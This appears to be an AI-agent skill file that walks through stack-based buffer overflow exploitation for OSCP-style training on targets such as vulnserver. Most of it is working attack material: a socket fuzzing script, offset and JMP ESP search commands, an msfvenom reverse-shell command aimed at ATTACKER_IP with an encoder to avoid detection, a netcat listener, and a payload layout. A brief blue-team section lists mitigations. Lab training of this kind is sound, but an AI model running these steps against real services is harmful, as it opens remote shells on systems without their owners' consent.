---
name: buffer-overflow-stack
description: >
  Identify, exploit, and write custom payloads for classic Stack-Based Buffer Overflows in 32-bit and 64-bit applications. Use this skill when conducting exploit development, reverse engineering custom network protocols, or preparing for advanced certifications (OSCP, OSEP). Covers fuzzing, controlling EIP/RIP, identifying bad characters, generating shellcode, finding return/JMP instructions, and gaining reverse shells.
domain: cybersecurity
subdomain: exploit-development
category: Exploit Development
difficulty: expert
estimated_time: "4-10 hours"
mitre_attack:
  tactics: [TA0001, TA0002, TA0004]
  techniques: [T1190, T1068, T1059]
platforms: [windows, linux]
tags: [buffer-overflow, exploit-development, reverse-engineering, shellcode, memory-corruption, oscp, immunity-debugger, gdb]
tools: [python, immunity-debugger, mona, gdb, pwndbg, msfvenom]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Buffer Overflow (Stack-Based)

## When to Use
- When discovering undocumented memory corruption vulnerabilities in proprietary network services, thick clients, or local binaries.
- During Exploit Development and Reverse Engineering tasks.
- When adapting public PoCs (Proof of Concepts) to bypass specific mitigations or target different OS versions.
- Required foundational knowledge for advanced certifications (OSCP, OSCE, etc.).


## Prerequisites
- Vulnerable target application binary (32-bit or 64-bit) for testing
- Debugger configured: Immunity Debugger + Mona.py (Windows) or GDB + pwndbg (Linux)
- Python 3 with pwntools library installed (`pip install pwntools`)
- Understanding of x86/x64 assembly, calling conventions, and memory layout

## Workflow

### Phase 1: Fuzzing & Crash Identification

```python
# Concept: Send progressively larger inputs to the target application
# until it crashes, indicating we overwrote the bounds of a buffer.

import socket, time, sys

ip = "10.10.10.10"
port = 9999
timeout = 5

# Create an array of increasing length strings
buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print(f"Fuzzing with {len(string)} bytes")
        s.send(bytes("COMMAND " + string + "\r\n", "latin-1"))
        s.recv(1024)
        s.close()
    except:
        print(f"Could not connect, server likely crashed at {len(string)} bytes.")
        sys.exit(0)
    time.sleep(1)

# Note the approx byte size where the crash occurred (e.g., 2000 bytes)
```

### Phase 2: Finding the Offset (Controlling EIP/RIP)

```bash
# Concept: Find EXACTLY which bytes in our buffer overwrite the Instruction Pointer (EIP in 32-bit).

# 1. Generate a unique cyclic pattern using Metasploit
msf-pattern_create -l 2400

# 2. Update exploit script to send this pattern instead of 'A's.
# 3. Crash the application while attached to a debugger (Immunity Debugger / GDB).
# 4. Check the value stored in EIP at the time of the crash (e.g., 356b4234).

# 5. Find the exact offset length
msf-pattern_offset -l 2400 -q 356b4234
# Output: Exact match at offset 2003

# 6. Verify control:
# payload = "A" * 2003 + "B" * 4 + "C" * (2400 - 2003 - 4)
# EIP should now cleanly equal 42424242 (BBBB)
```

### Phase 3: Finding Bad Characters

```python
# Concept: Send all possible hex characters (0x00 to 0xff) to see which ones get dropped,
# translated, or truncate the buffer. \x00 (Null Byte) is universally bad.

badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  # ... continue to \xff
)
# payload = "A" * 2003 + "B" * 4 + badchars

# Send payload, observe the memory dump in the debugger where the C's start.
# If characters are missing or altered, note them down, remove them from the array,
# restart the application, and test again until the sequence is pristine.
# Common bad chars: \x00, \x0a (Line feed), \x0d (Carriage return)
```

### Phase 4: Finding a Jump Module (JMP ESP)

```bash
# Concept: We need an instruction that jumps execution to the Stack (where our shellcode lives),
# bypassing ASLR if possible by finding a DLL without ASLR protections.

# Using Mona in Immunity Debugger:
# 1. Find modules lacking memory protections (ASLR, Rebase, SafeSEH, NX)
!mona modules

# 2. Search those specific unprotected modules for an equivalent of "JMP ESP" or "CALL ESP"
# Exclude bad characters found in Phase 3.
!mona jmp -r esp -cpb "\x00\x0a\x0d"

# 3. Choose a memory address (e.g., 0x625011af).
# 4. Format for payload (Little Endian format): \xaf\x11\x50\x62
# Replace "B" * 4 with this address.
```

### Phase 5: Generating Shellcode & Exploitation

```bash
# Concept: Generate reverse shell payload, avoiding bad characters, add NOP sled for stability.

# 1. Generate Shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f c

# 2. Final Python Exploit Structure:
# payload = b"A" * 2003                   # Offset padding
# payload += b"\xaf\x11\x50\x62"            # JMP ESP Address (EIP overwritten)
# payload += b"\x90" * 32                   # NOP Sled (Allows decoder space)
# payload += b"\xba\x3f\x11..."             # msfvenom shellcode

# 3. Set up netcat listener
nc -nvlp 4444

# 4. Fire final exploit. Catch shell.
```

## 🔵 Blue Team Detection & Defense
- **Compiler Mitigations**: Compile applications with ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention / No-eXecute), and Stack Canaries (Stack Cookies). These mitigations kill 99% of basic stack overflows.
- **Modern Hardware**: CPU-level enforced memory protections (e.g., Intel CET - Control-flow Enforcement Technology).
- **Safe Functions**: Developers must replace unsafe C functions (`strcpy`, `gets`, `sprintf`) with safe, bound-checking alternatives (`strncpy`, `fgets`, `snprintf`).
- **Endpoint Protection**: Modern EDRs actively detect processes launching cmd.exe/sh or making anomalous outbound network connections from unexpected processes.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Buffer Overflow | Writing more data to a block of memory (buffer) than it can hold |
| EIP / RIP | Instruction Pointer register; tells the CPU what to execute next |
| ESP / RSP | Stack Pointer; points to the top of the current stack frame |
| ASLR/DEP | Memory protections designed to randomize memory space and mark the stack as non-executable |
| NOP Sled | Sequence of No-Operation instructions (`\x90`) used to slide execution cleanly into payload |

## Output Format
```
Exploit Development Report
==========================
Target Binary: vulnserver.exe (TRUN Command)
Architecture: x86 (32-bit Windows)
Vulnerability: Buffer Overflow pointing to arbitrary code execution

Parameters Details:
Offset: 2003 bytes
Bad Characters: \x00, \x0a, \x0d
Return Address (JMP ESP): 0x625011af (essfunc.dll)
Payload Size limit: > 1000 bytes (plenty of room for reverse shell)

Proof of Concept:
Provided `exploit.py` successfully binds a reverse shell to 10.10.10.10:4444 overcoming the identified space without encountering ASLR/DEP restrictions on the target DLL.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Corelan: [Exploit Writing Tutorials](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- GitHub: [Mona.py Manual](https://github.com/corelan/mona)
- TryHackMe: [Buffer Overflow Prep Room](https://tryhackme.com/room/bufferoverflowprep)
